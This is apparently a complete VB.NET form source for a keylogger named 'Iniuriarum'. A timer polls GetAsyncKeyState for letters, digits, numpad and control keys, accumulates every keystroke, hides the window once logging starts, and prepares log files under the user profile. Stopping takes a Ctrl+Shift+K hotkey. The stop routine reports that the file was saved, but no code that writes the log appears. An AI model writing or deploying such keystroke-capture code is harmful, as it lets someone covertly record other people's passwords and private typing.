Public Class Form1

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short

    Public logInfo As String = ""

    Private Sub start_Click(sender As Object, e As EventArgs) Handles start.Click
        Guna2Transition1.Hide(Panel1)

    End Sub

    Public Sub StartLogging()

        StopMessage.ShowDialog()

        If StopMessage.DialogResult = DialogResult.OK Then
            NotifyIcon1.ShowBalloonTip(1000)
            Timer1.Start()
            Me.Visible = False
        End If

    End Sub

    Public Sub StopLogging()
        NotifyIcon1.BalloonTipText = "Iniuriarum stopped keylogging. File saved at '" & writePath.Text & "'."
        NotifyIcon1.ShowBalloonTip(1000)

        Timer1.Stop()
        'ConfirmStop.Wait(1000000)
        ConfirmStop.Close()
        Me.Close()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If (GetAsyncKeyState(65)) Then
            logInfo = logInfo + "A"
        ElseIf (GetAsyncKeyState(66)) Then
            logInfo = logInfo + "B"
        ElseIf (GetAsyncKeyState(67)) Then
            logInfo = logInfo + "C"
        ElseIf (GetAsyncKeyState(68)) Then
            logInfo = logInfo + "D"
        ElseIf (GetAsyncKeyState(69)) Then
            logInfo = logInfo + "E"
        ElseIf (GetAsyncKeyState(70)) Then
            logInfo = logInfo + "F"
        ElseIf (GetAsyncKeyState(71)) Then
            logInfo = logInfo + "G"
        ElseIf (GetAsyncKeyState(72)) Then
            logInfo = logInfo + "H"
        ElseIf (GetAsyncKeyState(73)) Then
            logInfo = logInfo + "I"
        ElseIf (GetAsyncKeyState(74)) Then
            logInfo = logInfo + "J"
        ElseIf (GetAsyncKeyState(75)) Then
            logInfo = logInfo + "K"
        ElseIf (GetAsyncKeyState(76)) Then
            logInfo = logInfo + "L"
        ElseIf (GetAsyncKeyState(77)) Then
            logInfo = logInfo + "M"
        ElseIf (GetAsyncKeyState(78)) Then
            logInfo = logInfo + "N"
        ElseIf (GetAsyncKeyState(79)) Then
            logInfo = logInfo + "O"
        ElseIf (GetAsyncKeyState(80)) Then
            logInfo = logInfo + "P"
        ElseIf (GetAsyncKeyState(81)) Then
            logInfo = logInfo + "Q"
        ElseIf (GetAsyncKeyState(82)) Then
            logInfo = logInfo + "R"
        ElseIf (GetAsyncKeyState(83)) Then
            logInfo = logInfo + "S"
        ElseIf (GetAsyncKeyState(84)) Then
            logInfo = logInfo + "T"
        ElseIf (GetAsyncKeyState(85)) Then
            logInfo = logInfo + "U"
        ElseIf (GetAsyncKeyState(86)) Then
            logInfo = logInfo + "V"
        ElseIf (GetAsyncKeyState(87)) Then
            logInfo = logInfo + "W"
        ElseIf (GetAsyncKeyState(88)) Then
            logInfo = logInfo + "X"
        ElseIf (GetAsyncKeyState(89)) Then
            logInfo = logInfo + "Y"
        ElseIf (GetAsyncKeyState(90)) Then
            logInfo = logInfo + "Z"
        ElseIf (GetAsyncKeyState(48)) Then
            logInfo = logInfo + "0"
        ElseIf (GetAsyncKeyState(49)) Then
            logInfo = logInfo + "1"
        ElseIf (GetAsyncKeyState(50)) Then
            logInfo = logInfo + "2"
        ElseIf (GetAsyncKeyState(51)) Then
            logInfo = logInfo + "3"
        ElseIf (GetAsyncKeyState(52)) Then
            logInfo = logInfo + "4"
        ElseIf (GetAsyncKeyState(53)) Then
            logInfo = logInfo + "5"
        ElseIf (GetAsyncKeyState(54)) Then
            logInfo = logInfo + "6"
        ElseIf (GetAsyncKeyState(55)) Then
            logInfo = logInfo + "7"
        ElseIf (GetAsyncKeyState(56)) Then
            logInfo = logInfo + "8"
        ElseIf (GetAsyncKeyState(57)) Then
            logInfo = logInfo + "9"
        ElseIf (GetAsyncKeyState(96)) Then
            logInfo = logInfo + "{Num0}"
        ElseIf (GetAsyncKeyState(97)) Then
            logInfo = logInfo + "{Num1}"
        ElseIf (GetAsyncKeyState(98)) Then
            logInfo = logInfo + "{Num2}"
        ElseIf (GetAsyncKeyState(99)) Then
            logInfo = logInfo + "{Num3}"
        ElseIf (GetAsyncKeyState(100)) Then
            logInfo = logInfo + "{Num4}"
        ElseIf (GetAsyncKeyState(101)) Then
            logInfo = logInfo + "{Num5}"
        ElseIf (GetAsyncKeyState(102)) Then
            logInfo = logInfo + "{Num6}"
        ElseIf (GetAsyncKeyState(103)) Then
            logInfo = logInfo + "{Num7}"
        ElseIf (GetAsyncKeyState(104)) Then
            logInfo = logInfo + "{Num8}"
        ElseIf (GetAsyncKeyState(105)) Then
            logInfo = logInfo + "{Num9}"
        ElseIf (GetAsyncKeyState(106)) Then
            logInfo = logInfo + "{Num*}"
        ElseIf (GetAsyncKeyState(107)) Then
            logInfo = logInfo + "{Num+}"
        ElseIf (GetAsyncKeyState(13)) Then
            logInfo = logInfo + "{Enter}"
        ElseIf (GetAsyncKeyState(109)) Then
            logInfo = logInfo + "{Num-}"
        ElseIf (GetAsyncKeyState(110)) Then
            logInfo = logInfo + "{Num.}"
        ElseIf (GetAsyncKeyState(111)) Then
            logInfo = logInfo + "{Num/}"
        ElseIf (GetAsyncKeyState(32)) Then
            logInfo = logInfo + " "
        ElseIf (GetAsyncKeyState(8)) Then
            logInfo = logInfo + "{Backspace}"
        ElseIf (GetAsyncKeyState(9)) Then
            logInfo = logInfo + "{Tab}"
        ElseIf (GetAsyncKeyState(16)) Then
            logInfo = logInfo + "{Shift}"
        ElseIf (GetAsyncKeyState(17)) Then
            logInfo = logInfo + "{Control}"
        ElseIf (GetAsyncKeyState(20)) Then
            logInfo = logInfo + "{Caps}"
        ElseIf (GetAsyncKeyState(27)) Then
            logInfo = logInfo + "{Esc}"
        ElseIf (GetAsyncKeyState(33)) Then
            logInfo = logInfo + "{PGup}"
        ElseIf (GetAsyncKeyState(34)) Then
            logInfo = logInfo + "{PGdn}"
        ElseIf (GetAsyncKeyState(35)) Then
            logInfo = logInfo + "{End}"
        ElseIf (GetAsyncKeyState(36)) Then
            logInfo = logInfo + "{Home}"
        ElseIf (GetAsyncKeyState(37)) Then
            logInfo = logInfo + "{LArrow}"
        ElseIf (GetAsyncKeyState(38)) Then
            logInfo = logInfo + "{UArrow}"
        ElseIf (GetAsyncKeyState(39)) Then
            logInfo = logInfo + "{RArrow}"
        ElseIf (GetAsyncKeyState(40)) Then
            logInfo = logInfo + "{DArrow}"
        ElseIf (GetAsyncKeyState(45)) Then
            logInfo = logInfo + "{Insert}"
        ElseIf (GetAsyncKeyState(46)) Then
            logInfo = logInfo + "{Del}"
        ElseIf (GetAsyncKeyState(144)) Then
            logInfo = logInfo + "{NumLock}"
        ElseIf (GetAsyncKeyState(188)) Then
            logInfo = logInfo + "{,}"
        End If

        Dim hotkey As Boolean
        hotkey = GetAsyncKeyState(Keys.K)
        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.ShiftKeyDown AndAlso hotkey Then
            ConfirmStop.Show()
        End If

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckLogFolder()
        writePath.Text = DetermineLogPath()
    End Sub

    Public Function DetermineLogPath()

        Dim fileCount As Integer = System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\Iniuriarum Keylogs", "*.txt").Count
        Dim num As Integer = 0

        While num < fileCount
            num += 1
        End While

        Dim finalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\Iniuriarum Keylogs\keylog_" & num & ".txt"

        Return finalPath

    End Function

    Private Sub logStart_Click(sender As Object, e As EventArgs) Handles logStart.Click
        StartLogging()
    End Sub

    Public Sub CheckLogFolder()
        Dim destination As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\Iniuriarum Keylogs"

        If System.IO.Directory.Exists(destination) = True Then
            Exit Sub
        Else
            System.IO.Directory.CreateDirectory(destination)
            CheckLogFolder()
        End If
    End Sub
End Class
